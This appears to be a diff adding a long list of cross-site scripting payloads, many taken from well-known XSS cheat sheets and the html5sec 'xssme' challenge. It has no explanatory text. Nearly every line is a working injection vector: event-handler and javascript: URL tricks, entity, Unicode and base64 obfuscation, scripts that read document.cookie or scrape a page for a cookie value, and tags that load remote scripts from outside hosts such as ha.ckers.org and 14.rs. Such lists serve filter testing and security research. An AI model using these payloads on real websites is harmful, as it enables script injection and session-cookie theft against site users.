+<xmp onbeforecopy="alert(1)" contenteditable>test</xmp>
+<xmp onbeforecut="alert(1)" contenteditable>test</xmp>
+<xmp onbeforepaste="alert(1)" contenteditable>test</xmp>
+<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xmp onclick="alert(1)">test</xmp>
+<xmp oncontextmenu="alert(1)">test</xmp>
+<xmp oncopy="alert(1)" contenteditable>test</xmp>
+<xmp oncut="alert(1)" contenteditable>test</xmp>
+<xmp ondblclick="alert(1)">test</xmp>
+<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>
+<xmp onkeydown="alert(1)" contenteditable>test</xmp>
+<xmp onkeypress="alert(1)" contenteditable>test</xmp>
+<xmp onkeyup="alert(1)" contenteditable>test</xmp>
+<xmp onmousedown="alert(1)">test</xmp>
+<xmp onmouseenter="alert(1)">test</xmp>
+<xmp onmouseleave="alert(1)">test</xmp>
+<xmp onmousemove="alert(1)">test</xmp>
+<xmp onmouseout="alert(1)">test</xmp>
+<xmp onmouseover="alert(1)">test</xmp>
+<xmp onmouseup="alert(1)">test</xmp>
+<xmp onpaste="alert(1)" contenteditable>test</xmp>
+<xss id=x tabindex=1 onactivate=alert(1)></xss>
+<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>
+<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<xss id=x tabindex=1 onfocusin=alert(1)></xss>
+<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>
+'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
+<<scr\0ipt/src=http://xss.com/xss.js></script
+%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
+' onmouseover=alert(/XSS/)
+"><iframe%20src="http://google.com"%%203E
+'<script>window.onload=function(){document.forms[0].message.value='1';}</script>
+x”</title><img src%3dx onerror%3dalert(1)>
+<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>
+<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>
+<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>
+<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>
+<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>
+<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>
+<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>
+<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
+<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>
+<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>
+<script>alert(document.head.innerHTML.substr(146,20));</script>
+<script>alert(document.head.childNodes[3].text)</script>
+<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>
+<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>
+<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>
+<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>
+<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>
+<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>
+<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>
+<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>
+<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>
+<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #
+<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #
+<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
+<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#
+<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23
+<script for=document event=onreadystatechange>getElementById('safe123').click()</script>
+<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>
+<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>
+<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>
+<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#
+<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>
+<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>
+<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>
+<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>
+<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
+<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>
+<a target="x" href="xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E
+<a target="x" href="xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>
+<a target="x" href="xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>
+<a target="x" href="xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();
+Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>
+<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ?
+<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">?
+<var onmouseover="prompt(1)">On Mouse Over</var>?
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
+<img src="/" =_=" title="onerror='prompt(1)'">
+<%<!--'%><script>alert(1);</script -->
+<script src="data:text/javascript,alert(1)"></script>
+<iframe/src \/\/onload = prompt(1)
+<iframe/onreadystatechange=alert(1)
+<svg/onload=alert(1)
+<input value=<><iframe/src=javascript:confirm(1)
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+http://www.<script>alert(1)</script .com
+<iframe  src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ?
+<svg><script ?>alert(1)
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+<img src=`xx:xx`onerror=alert(1)>
+<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>?
+<svg contentScriptType=text/vbs><script>MsgBox+1
+<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
+<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
+<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
+<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
+<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????
+<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
+<script>+-+-1-+-+alert(1)</script>
+<body/onload=&lt;!--&gt;&#10alert(1)>
+<script itworksinallbrowsers>/*<script* */alert(1)</script ?
+<img src ?itworksonchrome?\/onerror = alert(1)???
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg><script onlypossibleinopera:-)> alert(1)
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<script x> alert(1) </script 1=2
+<div/onmouseover='alert(1)'> style="x:">
+<--`<img/src=` onerror=alert(1)> --!>
+<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?
+<div  style="position:absolute;top:0;left:0;width:100%;height:100%"  onmouseover="prompt(1)" onclick="alert(1)">x</button>?
+"><img src=x onerror=window.open('https://www.google.com/');>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<math><a xlink:href="//jsfiddle.net/t846h/">click
+<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?
+<iframe  src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
+"><img src=x onerror=prompt(1);>
+<SCRIPT>alert('XSS');</SCRIPT>
+'';!--"<XSS>=&{()}
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+SRC=&#10<IMG 6;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
+<IMG SRC="javascript:alert('XSS')"
+<SCRIPT>a=/XSS/
+\";alert('XSS');//
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mocha:[code]">
+<IMG SRC="livescript:[code]">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="Link" Content="<javascript:alert('XSS')>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<XSS STYLE='no\xss:noxss("*//*");
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<BASE HREF="javascript:alert('XSS');//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+getURL("javascript:alert('XSS')")
+a="get";
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
+<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
+<HTML><BODY>
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+<? echo('<SCR)';
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCriPt x>(((confirm)))``</scRipt x>
+<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
+<deTAiLs/open/oNtoGGle=confirm()>
+<scRiPt y="><">/*<sCRipt* */prompt()</script
+<A href="javascript%26colon;confirm()">click
+<sVg oNloaD=write()>
+<A href=javas%26#99;ript:alert(1)>click
+<sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
+<svG/x=">"/oNloaD=confirm()//
+<--`<iMG/srC=` onerror=confirm``> --!>
+<SVg </onlOad ="1> (_=prompt,_(1)) "">
+<!--><scRipT src=//14.rs>
+<sCriPt/src=//14.rs?
+<sCRIpt x=">" src=//15.rs></script>
+<D3/OnMouSEenTer=[2].find(confirm)>z
+<D3"<"/OncLick="1>[confirm``]"<">z
+<D3/OnpOinTeReENter=confirm``>click here
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<Z oncut=alert()>x
+<iFrAMe/src \/\/onload = prompt(1)
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+>>> vectors()
